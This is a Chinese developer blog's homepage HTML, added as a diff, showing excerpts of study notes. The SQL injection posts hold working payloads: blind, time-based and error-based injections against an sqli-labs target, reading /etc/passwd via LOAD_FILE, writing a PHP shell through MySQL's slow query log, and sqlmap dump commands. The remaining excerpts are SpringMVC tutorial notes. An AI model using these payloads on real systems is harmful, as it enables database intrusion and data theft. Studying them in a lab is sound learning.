@@ -1,0 +1,1582 @@
+
+<!DOCTYPE html>
+<html lang="zh ">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>菜菜 || 开发小白</title>
+    <meta name="author" content="kevin7gif">
+    <meta name="description" content="Kevin's blog ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="//img/16584.png">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/maiden-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+
+    <div id="loading"
+        style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div
+            style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent"
+                style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#a3ddfb; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p>加载过慢请开启缓存(浏览器默认开启)</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">菜菜</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled" />
+            </span>
+            <span>home</span>
+        </a>
+        
+        <a href="/about">
+            <span>
+                <a-icon type="idcard" theme="filled" />
+            </span>
+            <span>about</span>
+        </a>
+        
+        <a href="/archives">
+            <span>
+                <a-icon type="folder" theme="filled" />
+            </span>
+            <span>archives</span>
+        </a>
+        
+        <a href="/categories">
+            <span>
+                <a-icon type="book" theme="filled" />
+            </span>
+            <span>categories</span>
+        </a>
+        
+        <a href="/tags">
+            <span>
+                <a-icon type="tags" theme="filled" />
+            </span>
+            <span>tags</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled" />
+            </span>
+            <span>菜菜</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">home</div>
+                </div>
+            </a>
+            
+            <a href="/about">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="idcard" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">about</div>
+                </div>
+            </a>
+            
+            <a href="/archives">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="folder" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">archives</div>
+                </div>
+            </a>
+            
+            <a href="/categories">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="book" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">categories</div>
+                </div>
+            </a>
+            
+            <a href="/tags">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="tags" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">tags</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                    <div id="home-head" style=background-image:url('../home.jpg')>
+    <script>
+        var menu = document.getElementById("menu")
+        menu.className += " menu-color"
+    </script>
+     
+    <div id="home-info" class="home-info" @click="home_click">
+        <span class="loop"></span>
+        <span class="loop"></span>
+        <span class="loop"></span>
+        <span class="loop"></span>
+        <span class="info">
+            <div class="wrap">
+                <h1>菜菜</h1>
+                <h3>开发小白</h3>
+                <h5>Kevin's blog</h5>
+            </div>
+        </span>
+    </div>
+     
+</div>
+
+
+
+<div id="home-posts-wrap" class=>
+    <div id="home-posts">
+
+        <div id="posts">
+            
+
+<div class="post">
+
+    <a href="/2023/05/16/菜狗带俩娃/安全/SQL注入/">
+        <h2>
+            
+        </h2>
+    </a>
+
+    <div class="category-and-date">
+
+        
+
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled" />
+            </span>
+            2023/5/16
+        </span>
+
+    </div>
+
+    <div class="excerpt">
+        <div class="content" v-pre>
+            
+            
+            <h1 id="day1-mysql注入初探"><a href="#day1-mysql注入初探" class="headerlink" title="day1:mysql注入初探"></a>day1:mysql注入初探</h1><ul>
+<li>sql注入原理:</li>
+</ul>
+<p>sql注入的原理是将sql代码伪装到输入参数中，传递到服务器解析并执行的一种攻击手法。也就是说，在一些对server端发起的请求参数中植入一些sql代码，server端在执行sql操作时，会拼接对应参数，同时也将一些sql注入攻击的“sql”拼接起来，导致会执行一些预期之外的操作。</p>
+<pre><code class="React">注释符号: #,--
+
+order by 用于判断显示位，order by 原有的作用是对字段进行一个排序,在sql注入中用order by 来判断排序order by 1就是对一个字段进行排序，如果一共四个字段，你order by 5 数据库不知道怎么排序，就错误了无返回值。
+
+information_schema.tables存放表名和库名的对应
+
+information_schema.columns存放字段名和表名的对应
+
+database();
+
+查询所有数据库：
+
+select group_concat(schema_name) from (information_schema.schemata)
+
+查询某数据库表名:
+
+select group_concat(table_name) from information_schema.tables where table_schema=&quot;security&quot;
+
+查某表列名：
+
+select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;email&#39;   //admin为查出来的表名
+
+查某列中的数据
+
+select group_concat(列名) from 数据库.表名
+</code></pre>
+
+            
+        </div>
+    </div>
+
+    <div class="post-tags">
+        
+        
+    </div>
+
+    <a href="/2023/05/16/菜狗带俩娃/安全/SQL注入/ " class="go-post">
+        阅读全文
+    </a>
+</div>
+
+<div class="post">
+
+    <a href="/2023/05/16/菜狗带俩娃/安全/day4 mysql注入读写文件以及权限/">
+        <h2>
+            
+        </h2>
+    </a>
+
+    <div class="category-and-date">
+
+        
+
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled" />
+            </span>
+            2023/5/16
+        </span>
+
+    </div>
+
+    <div class="excerpt">
+        <div class="content" v-pre>
+            
+            
+            <h1 id="day4-mysql注入读写文件以及权限问题-amp-amp-sqlmap初识"><a href="#day4-mysql注入读写文件以及权限问题-amp-amp-sqlmap初识" class="headerlink" title="day4 mysql注入读写文件以及权限问题&amp;&amp;sqlmap初识"></a>day4 mysql注入读写文件以及权限问题&amp;&amp;sqlmap初识</h1><h3 id="判断用户是否具有file权限"><a href="#判断用户是否具有file权限" class="headerlink" title="判断用户是否具有file权限"></a>判断用户是否具有file权限</h3><pre><code class="React">select file_priv,user,host from mysql.user;
+</code></pre>
+<h3 id="查看可写入的路径"><a href="#查看可写入的路径" class="headerlink" title="查看可写入的路径"></a>查看可写入的路径</h3><pre><code class="React">secure_file_priv=&#39;&#39;
+
+secure_file_priv可以设置如下这样进行设置：
+1. 设置为空，那么对所有路径均可进行导入导出。
+2. 设置为一个目录名字，那么只允许在该路径下导入导出。
+3. 设置为Null，那么禁止所有导入导出。
+Mysql&gt;=5.5.53 默认为NULL，即默认禁止导入导出，并且不能通过sql语句进行修改
+Mysql&lt;5.5.53 默认为空，即默认无限制
+
+需要在mysql的配置文件中更改：
+[mysqld]
+secure_file_priv=&quot;&quot;
+</code></pre>
+<h3 id="load-file读取文件"><a href="#load-file读取文件" class="headerlink" title="load_file读取文件"></a>load_file读取文件</h3><pre><code class="React">SELECT LOAD_FILE(&#39;/etc/passwd&#39;);
+windows系统下文件路径用正斜杠
+</code></pre>
+<h3 id="select-into-写入文件"><a href="#select-into-写入文件" class="headerlink" title="select into  写入文件"></a>select into  写入文件</h3><pre><code class="React">select &#39;&lt;?php phpinfo(); ?&gt;&#39; into outfile &#39;c:/1.txt&#39;;
+</code></pre>
+<h3 id="写入日志文件"><a href="#写入日志文件" class="headerlink" title="写入日志文件"></a>写入日志文件</h3><p>查询日志文件位置</p>
+<pre><code class="React">show variables like &#39;%general%&#39;;
+</code></pre>
+<p>开启日志记录，一般情况下都是没有开的</p>
+<pre><code class="React">set global general_log = on;
+</code></pre>
+<p>设置日志记录的位置</p>
+<pre><code class="React">set global general_log_file = &#39;G:/2.txt&#39;;
+</code></pre>
+<p>然后直接输入便可被记录下来</p>
+<p>最后记得改回原来的日志路径，并且关闭日志记录</p>
+<h3 id="慢查询写shell"><a href="#慢查询写shell" class="headerlink" title="慢查询写shell"></a>慢查询写shell</h3><p>当查询语句执行的时间要超过系统默认的时间时,该语句才会被记入进慢查询日志</p>
+<p>由于开启日志监测后文件会很大，网站访问量大的话我们写的shell会出错,还有可能被发现</p>
+<pre><code class="React">show variables like &#39;%slow_query_log%&#39;;    查看慢查询信息
+
+set global slow_query_log=1;        启用慢查询日志(默认禁用)
+
+set global slow_query_log_file=&#39;C:\phpStudy\WWW\shell.php&#39;;  修改日志文件路径
+
+select &#39;123123&#39; or sleep(11);        写文件
+</code></pre>
+<p>Mysql登录用户名密码存储在C:\phpstudy_pro\Extensions\MySQL5.7.26\data\mysql\user.MYD中</p>
+<h3 id="mysql远程登录设置"><a href="#mysql远程登录设置" class="headerlink" title="mysql远程登录设置"></a>mysql远程登录设置</h3><pre><code class="React">use mysql;
+select host,user from user；
+update user set host = ’%’ where user = ’root’; 将host值改为%即可
+flush privileges;  刷新权限
+
+
+</code></pre>
+<h3 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h3><p>询数据库：sqlmap -u url -dbs</p>
+<p>查某数据库中的表 sqlmap -u url -D 数据库名 -tables</p>
+<p>查询某数据库中某表的列 sqlmap -u url -D 数据库名 -T 表名 -columns</p>
+<p>查询表中的信息 sqlmap -u url -D 数据库名 -T 表名 -C 字段1,字段2,字段3 –dump</p>
+
+            
+        </div>
+    </div>
+
+    <div class="post-tags">
+        
+        
+    </div>
+
+    <a href="/2023/05/16/菜狗带俩娃/安全/day4 mysql注入读写文件以及权限/ " class="go-post">
+        阅读全文
+    </a>
+</div>
+
+<div class="post">
+
+    <a href="/2023/05/16/菜狗带俩娃/安全/day2_mysql 注入/">
+        <h2>
+            
+        </h2>
+    </a>
+
+    <div class="category-and-date">
+
+        
+
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled" />
+            </span>
+            2023/5/16
+        </span>
+
+    </div>
+
+    <div class="excerpt">
+        <div class="content" v-pre>
+            
+            
+            <h1 id="day2-mysql-注入"><a href="#day2-mysql-注入" class="headerlink" title="day2:mysql 注入"></a>day2:mysql 注入</h1><p>信息搜集:</p>
+<p>查找版本</p>
+<pre><code class="React">select version();
+select @@version;
+select /*!40000 user()*/;
+</code></pre>
+<p>查找mysql路径</p>
+<pre><code class="React">select @@datadir;
+</code></pre>
+<p>查找操作系统</p>
+<pre><code class="React">select @@version_compile_os;
+</code></pre>
+<p><code>system_user()</code> &#x2F;&#x2F;系统用户名 </p>
+<p><code>user()</code>  &#x2F;&#x2F; 用户名 </p>
+<p><code>current_user()</code>  &#x2F;&#x2F;当前用户名</p>
+<p><code>session_user()</code> &#x2F;&#x2F;链接数据库的用户名</p>
+<p>分隔符</p>
+<pre><code class="React">1. concat(str1,str2,...)——没有分隔符地连接字符串 
+2. concat_ws(separator,str1,str2,...)——含有分隔符地连接字符串 
+3. group_concat(str1,str2,...)——连接一个组的所有字符串，并以逗号分隔每一条数据
+</code></pre>
+<p>截取字符</p>
+<pre><code class="React">mid(database(),1,1)&gt;&#39;a&#39;   查看数据库第一位   mid(string,start,length)
+</code></pre>
+<pre><code class="React">substr(string,start,length) 同 substring
+</code></pre>
+<pre><code class="React">left(string,n)  n为长度
+</code></pre>
+<pre><code class="React">ord(mid(database(),1,1))&gt;114 检测database()的第一位ascii码是否大于114,同ascii()
+</code></pre>
+<p><img src="/image/image.png"></p>
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注:"></a>盲注:</h3><p>基于布尔 SQL 盲注<br>基于时间的 SQL 盲注<br>基于报错的 SQL 盲注</p>
+<h3 id="less-5"><a href="#less-5" class="headerlink" title="less 5"></a>less 5</h3><p>布尔盲注:</p>
+<pre><code class="React">http://192.168.162.130/Less-5/?id=1&#39;  and if((select mid((select group_concat(table_name) from information_schema.tables where table_schema=&quot;security&quot;),1,1)&gt;&#39;a&#39;),1,0)--+
+</code></pre>
+<pre><code class="React">http://192.168.162.130/Less-5/?id=1&#39;  and 1=if((select mid((select group_concat(table_name) from information_schema.tables where table_schema=&quot;security&quot;),1,7)=&#39;emails,&#39;),1,0)--+
+</code></pre>
+<p>用ascii码判断</p>
+<pre><code class="React">http://192.168.162.130/Less-5/?id=1&#39;  and 1=if((select ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=&quot;security&quot;),1,1))&gt;60),1,0)--+
+</code></pre>
+<p>基于时间的 SQL 盲注:</p>
+<pre><code class="React">http://192.168.162.130/Less-5/?id=1&#39;  and if((select mid((select group_concat(table_name) from information_schema.tables where table_schema=&quot;security&quot;),1,sleep(5))=&#39;a&#39;),1,0)--+
+</code></pre>
+<p>基于报错的 SQL 盲注:</p>
+<p>因为concat()是将其连接成一个字符串，不符合xpath_string格式，会出现格式错误而报错</p>
+<ul>
+<li>updatexml</li>
+</ul>
+<pre><code class="React">1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)
+</code></pre>
+<pre><code class="React">1&#39; and updatexml(1,concat(0x7,substring((select group_concat(schema_name) from information_schema.schemata),1,32)),0)
+</code></pre>
+<ul>
+<li>extractvalue</li>
+</ul>
+<pre><code class="React">1&#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))
+</code></pre>
+<pre><code class="React">-1&#39; and extractvalue(1,concat(0x7,substring((select group_concat(schema_name) from information_schema.schemata),60,32)))
+</code></pre>
+<ul>
+<li>当substring被过滤时,可用left(),right()将字符串进行拼接</li>
+</ul>
+<pre><code class="React">1&#39;^(updatexml(1,concat(0x7e,(select(right(password,30))from(H4rDsq1))),1))
+</code></pre>
+<pre><code class="React">1&#39;^(updatexml(1,concat(0x7e,(select(left(password,30))from(H4rDsq1))),1))
+</code></pre>
+<p>宽字节,insert注入,delete注入,二次注入</p>
+
+            
+        </div>
+    </div>
+
+    <div class="post-tags">
+        
+        
+    </div>
+
+    <a href="/2023/05/16/菜狗带俩娃/安全/day2_mysql 注入/ " class="go-post">
+        阅读全文
+    </a>
+</div>
+
+<div class="post">
+
+    <a href="/2023/05/16/菜狗带俩娃/SpringMVC/结果跳转方式/">
+        <h2>
+            
+        </h2>
+    </a>
+
+    <div class="category-and-date">
+
+        
+
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled" />
+            </span>
+            2023/5/16
+        </span>
+
+    </div>
+
+    <div class="excerpt">
+        <div class="content" v-pre>
+            
+            
+            <h3 id="ModelAndView"><a href="#ModelAndView" class="headerlink" title="ModelAndView"></a>ModelAndView</h3><p>设置ModelAndView对象 , 根据view的名称 , 和视图解析器跳到指定的页面 .</p>
+<p>页面 : {视图解析器前缀} + viewName +{视图解析器后缀}</p>
+<pre><code class="xml">&lt;!-- 视图解析器 --&gt;
+&lt;bean class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;
+      id=&quot;internalResourceViewResolver&quot;&gt;
+    &lt;!-- 前缀 --&gt;
+    &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/jsp/&quot; /&gt;
+    &lt;!-- 后缀 --&gt;
+    &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot; /&gt;
+&lt;/bean&gt;
+</code></pre>
+<p>对应的controller类</p>
+<pre><code class="java">public class ControllerTest1 implements Controller &#123;
+    public ModelAndView handleRequest(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) throws Exception &#123;
+        //返回一个模型视图对象
+        ModelAndView mv = new ModelAndView();
+        mv.addObject(&quot;msg&quot;,&quot;ControllerTest1&quot;);
+        mv.setViewName(&quot;test&quot;);
+        return mv;
+    &#125;
+&#125;
+</code></pre>
+<h3 id="5-2、ServletAPI"><a href="#5-2、ServletAPI" class="headerlink" title="5.2、ServletAPI"></a>5.2、ServletAPI</h3><p>通过设置ServletAPI , 不需要视图解析器 .</p>
+<ol>
+<li>通过HttpServletResponse进行输出</li>
+<li>通过HttpServletResponse实现重定向</li>
+<li>通过HttpServletResponse实现转发</li>
+</ol>
+<pre><code class="java">@Controller
+public class ResultGo &#123;
+    @RequestMapping(&quot;/result/t1&quot;)
+    public void test1(HttpServletRequest req, HttpServletResponse rsp) throws IOException &#123;
+        rsp.getWriter().println(&quot;Hello,Spring BY servlet API&quot;);
+    &#125;
+    @RequestMapping(&quot;/result/t2&quot;)
+    public void test2(HttpServletRequest req, HttpServletResponse rsp) throws IOException &#123;
+        rsp.sendRedirect(&quot;/index.jsp&quot;);
+    &#125;
+    @RequestMapping(&quot;/result/t3&quot;)
+    public void test3(HttpServletRequest req, HttpServletResponse rsp) throws Exception &#123;
+        //转发
+        req.setAttribute(&quot;msg&quot;,&quot;/result/t3&quot;);
+        req.getRequestDispatcher(&quot;/WEB-INF/jsp/test.jsp&quot;).forward(req,rsp);
+    &#125;
+&#125;
+</code></pre>
+<h3 id="5-3、SpringMVC"><a href="#5-3、SpringMVC" class="headerlink" title="5.3、SpringMVC"></a>5.3、SpringMVC</h3><p><strong>通过SpringMVC来实现转发和重定向 - 无需视图解析器；</strong></p>
+<p>测试前，需要将视图解析器注释掉</p>
+<pre><code class="java">@Controller
+public class ResultSpringMVC &#123;
+    @RequestMapping(&quot;/rsm/t1&quot;)
+    public String test1()&#123;
+        //转发
+        return &quot;/index.jsp&quot;;
+    &#125;
+    @RequestMapping(&quot;/rsm/t2&quot;)
+    public String test2()&#123;
+        //转发二
+        return &quot;forward:/index.jsp&quot;;
+    &#125;
+    @RequestMapping(&quot;/rsm/t3&quot;)
+    public String test3()&#123;
+        //重定向
+        return &quot;redirect:/index.jsp&quot;;
+    &#125;
+&#125;
+</code></pre>
+<p><strong>通过SpringMVC来实现转发和重定向 - 有视图解析器；</strong></p>
+<p>重定向 , 不需要视图解析器 , 本质就是重新请求一个新地方嘛 , 所以注意路径问题.</p>
+<p>可以重定向到另外一个请求实现 .</p>
+<pre><code class="java">@Controller
+public class ResultSpringMVC2 &#123;
+    @RequestMapping(&quot;/rsm2/t1&quot;)
+    public String test1()&#123;
+        //转发
+        return &quot;test&quot;;
+    &#125;
+    @RequestMapping(&quot;/rsm2/t2&quot;)
+    public String test2()&#123;
+        //重定向
+        return &quot;redirect:/index.jsp&quot;;
+        //return &quot;redirect:hello.do&quot;; //hello.do为另一个请求/
+    &#125;
+&#125;
+</code></pre>
+
+            
+        </div>
+    </div>
+
+    <div class="post-tags">
+        
+        
+    </div>
+
+    <a href="/2023/05/16/菜狗带俩娃/SpringMVC/结果跳转方式/ " class="go-post">
+        阅读全文
+    </a>
+</div>
+
+<div class="post">
+
+    <a href="/2023/05/16/菜狗带俩娃/SpringMVC/拦截器/">
+        <h2>
+            
+        </h2>
+    </a>
+
+    <div class="category-and-date">
+
+        
+
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled" />
+            </span>
+            2023/5/16
+        </span>
+
+    </div>
+
+    <div class="excerpt">
+        <div class="content" v-pre>
+            
+            
+            <p>针对请求和响应进行的额外的处理，在请求和响应的过程中添加预处理，后处理和最终处理</p>
+<p><img src="C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20230414190245098.png" alt="image-20230414190245098"></p>
+<p>SpringMVC的处理器拦截器类似于Servlet开发中的过滤器Filter,用于对处理器进行预处理和后处理。开发者可以自己定义一些拦截器来实现特定的功能。</p>
+<p><strong>过滤器与拦截器的区别：</strong>拦截器是AOP思想的具体应用。</p>
+<p><strong>过滤器</strong></p>
+<ul>
+<li>servlet规范中的一部分，任何java web工程都可以使用</li>
+<li>在url-pattern中配置了&#x2F;*之后，可以对所有要访问的资源进行拦截</li>
+</ul>
+<p><strong>拦截器</strong></p>
+<ul>
+<li>拦截器是SpringMVC框架自己的，只有使用了SpringMVC框架的工程才能使用</li>
+<li>拦截器只会拦截访问的控制器方法， 如果访问的是jsp&#x2F;html&#x2F;css&#x2F;image&#x2F;js是不会进行拦截的</li>
+</ul>
+<p>拦截器的执行时机：</p>
+<ul>
+<li>preHandle()：在请求被处理之前进行操作，预处理</li>
+<li>postHandle()：在请求被处理之后，但结果还没有渲染前进行操作，可以改变响应结果，后处理</li>
+<li>afterCompletion()：所有的请求响应结束后执行善后工作，清理对象，关闭资源，最终处理</li>
+</ul>
+<p>拦截器实现的两种方式：</p>
+<ul>
+<li>继承HandlerInterceptorAdapter的父类</li>
+<li><strong>实现HandleInterceptor接口，实现的接口，推荐使用实现接口的方式</strong></li>
+</ul>
+<p>拦截器实现的步骤：</p>
+<ul>
+<li><p>改造登陆方法，在session中存储用户信息，用于进行权限验证</p>
+</li>
+<li><p>开发拦截器的功能，实现HandleInterceptor接口，重写preHandle()方法</p>
+<ul>
+<li><pre><code class="java">package com.kuang.interceptor;
+import org.springframework.web.servlet.HandlerInterceptor;
+import org.springframework.web.servlet.ModelAndView;
+import javax.servlet.ServletException;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import javax.servlet.http.HttpSession;
+import java.io.IOException;
+public class LoginInterceptor implements HandlerInterceptor &#123;
+    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws ServletException, IOException &#123;
+        // 如果是登陆页面则放行
+        System.out.println(&quot;uri: &quot; + request.getRequestURI());
+        if (request.getRequestURI().contains(&quot;login&quot;)) &#123;
+            return true;
+        &#125;
+        HttpSession session = request.getSession();
+        // 如果用户已登陆也放行
+        if(session.getAttribute(&quot;user&quot;) != null) &#123;
+            return true;
+        &#125;
+        // 用户没有登陆跳转到登陆页面
+        request.getRequestDispatcher(&quot;/WEB-INF/jsp/login.jsp&quot;).forward(request, response);
+        return false;
+    &#125;
+    public void postHandle(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object o, ModelAndView modelAndView) throws Exception &#123;
+    &#125;
+    public void afterCompletion(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object o, Exception e) throws Exception &#123;
+    &#125;
+&#125;
+</code></pre>
+</li>
+<li><p>编写一个controller处理请求</p>
+</li>
+<li><pre><code class="java">package com.kuang.controller;
+import org.springframework.stereotype.Controller;
+import org.springframework.web.bind.annotation.RequestMapping;
+import javax.servlet.http.HttpSession;
+@Controller
+@RequestMapping(&quot;/user&quot;)
+public class UserController &#123;
+    //跳转到登陆页面
+    @RequestMapping(&quot;/jumplogin&quot;)
+    public String jumpLogin() throws Exception &#123;
+        return &quot;login&quot;;
+    &#125;
+    //跳转到成功页面
+    @RequestMapping(&quot;/jumpSuccess&quot;)
+    public String jumpSuccess() throws Exception &#123;
+        return &quot;success&quot;;
+    &#125;
+    //登陆提交
+    @RequestMapping(&quot;/login&quot;)
+    public String login(HttpSession session, String username, String pwd) throws Exception &#123;
+        // 向session记录用户身份信息
+        System.out.println(&quot;接收前端===&quot;+username);
+        session.setAttribute(&quot;user&quot;, username);
+        return &quot;success&quot;;
+    &#125;
+    //退出登陆
+    @RequestMapping(&quot;logout&quot;)
+    public String logout(HttpSession session) throws Exception &#123;
+        // session 过期
+        session.invalidate();
+        return &quot;login&quot;;
+    &#125;
+&#125;
+</code></pre>
+</li>
+<li><p>编写一个登录页面login.jsp</p>
+</li>
+<li><pre><code class="jsp">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Title&lt;/title&gt;
+&lt;/head&gt;
+&lt;h1&gt;登录页面&lt;/h1&gt;
+&lt;hr&gt;
+&lt;body&gt;
+&lt;form action=&quot;$&#123;pageContext.request.contextPath&#125;/user/login&quot;&gt;
+    用户名：&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt; &lt;br&gt;
+    密码： &lt;input type=&quot;password&quot; name=&quot;pwd&quot;&gt; &lt;br&gt;
+    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+</li>
+<li><p>编写一个登陆成功的页面success.jsp</p>
+</li>
+<li><pre><code class="jsp">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Title&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1&gt;登录成功页面&lt;/h1&gt;
+&lt;hr&gt;
+$&#123;user&#125;
+&lt;a href=&quot;$&#123;pageContext.request.contextPath&#125;/user/logout&quot;&gt;注销&lt;/a&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+</li>
+</ul>
+</li>
+<li><p>在springmvc.xml文件中注册拦截器</p>
+<ul>
+<li><pre><code class="xml">&lt;!--关于拦截器的配置--&gt;
+&lt;mvc:interceptors&gt;
+    &lt;mvc:interceptor&gt;
+        &lt;mvc:mapping path=&quot;/**&quot;/&gt;
+        &lt;bean id=&quot;loginInterceptor&quot; class=&quot;com.kuang.interceptor.LoginInterceptor&quot;/&gt;
+    &lt;/mvc:interceptor&gt;
+&lt;/mvc:interceptors&gt;
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+
+            
+        </div>
+    </div>
+
+    <div class="post-tags">
+        
+        
+    </div>
+
+    <a href="/2023/05/16/菜狗带俩娃/SpringMVC/拦截器/ " class="go-post">
+        阅读全文
+    </a>
+</div>
+
+<div class="post">
+
+    <a href="/2023/05/16/菜狗带俩娃/SpringMVC/SpringMVC初探/">
+        <h2>
+            
+        </h2>
+    </a>
+
+    <div class="category-and-date">
+
+        
+
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled" />
+            </span>
+            2023/5/16
+        </span>
+
+    </div>
+
+    <div class="excerpt">
+        <div class="content" v-pre>
+            
+            
+            <h3 id="什么是SpringMVC："><a href="#什么是SpringMVC：" class="headerlink" title="什么是SpringMVC："></a>什么是SpringMVC：</h3><ul>
+<li>是基于MVC开发模式的框架，用来优化控制器，是Spring家族的一员，他也具备IoC和AOP</li>
+<li>与Servlet技术功能相同，属于web层开发技术</li>
+</ul>
+<p>什么是MVC：是一种开发模式，所有的web应用都是基于MVC开发</p>
+<p>当发起请求时被前置的控制器拦截到请求，根据请求参数生成代理请求，找到请求对应的实际控制器，控制器处理请求，创建数据模型，访问数据库，将模型响应给中心控制器，控制器使用模型与视图渲染视图结果，将结果返回给中心控制器，再将结果返回给请求者</p>
+<p><img src="C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20230325122037342.png" alt="image-20230325122037342"></p>
+<p><img src="https://kuangstudy.oss-cn-beijing.aliyuncs.com/bbs/2021/04/13/kuangstudy00854e07-7eac-476c-a9dd-dcebb7ac0b89.png" alt="img"></p>
+<h3 id="SpringMVC优点："><a href="#SpringMVC优点：" class="headerlink" title="SpringMVC优点："></a>SpringMVC优点：</h3><ul>
+<li>轻量级，基于MVC框架</li>
+<li>易上手，容易理解，功能强大</li>
+<li>具备IoC和AOP</li>
+<li>完全基于注解开发</li>
+</ul>
+<h3 id="SpringMVC执行流程"><a href="#SpringMVC执行流程" class="headerlink" title="SpringMVC执行流程"></a>SpringMVC执行流程</h3><p><img src="https://kuangstudy.oss-cn-beijing.aliyuncs.com/bbs/2021/04/13/kuangstudy0214fd0a-0df0-4910-a467-5b7d61712868.png" alt="img"></p>
+<p><strong>简要分析执行流程</strong></p>
+<ol>
+<li>DispatcherServlet表示前置控制器，是整个SpringMVC的控制中心。用户发出请求，DispatcherServlet接收请求并拦截请求。</li>
+</ol>
+<p>我们假设请求的url为 : <a target="_blank" rel="noopener" href="http://localhost:8080/SpringMVC/hello">http://localhost:8080/SpringMVC/hello</a></p>
+<p><strong>如上url拆分成三部分：</strong></p>
+<p><a href="http://localhost:8080服务器域名/">http://localhost:8080服务器域名</a></p>
+<p>SpringMVC部署在服务器上的web站点</p>
+<p>hello表示控制器</p>
+<p>通过分析，如上url表示为：请求位于服务器localhost:8080上的SpringMVC站点的hello控制器。</p>
+<ol>
+<li>HandlerMapping为处理器映射。DispatcherServlet调用HandlerMapping,HandlerMapping根据请求url查找Handler。</li>
+<li>HandlerExecution表示具体的Handler,其主要作用是根据url查找控制器，如上url被查找控制器为：hello。</li>
+<li>HandlerExecution将解析后的信息传递给DispatcherServlet,如解析控制器映射等。</li>
+<li>HandlerAdapter表示处理器适配器，其按照特定的规则去执行Handler。</li>
+<li>Handler让具体的Controller执行。</li>
+<li>Controller将具体的执行信息返回给HandlerAdapter,如ModelAndView。</li>
+<li>HandlerAdapter将视图逻辑名或模型传递给DispatcherServlet。</li>
+<li>DispatcherServlet调用视图解析器(ViewResolver)来解析HandlerAdapter传递的逻辑视图名。</li>
+<li>视图解析器将解析的逻辑视图名传给DispatcherServlet。</li>
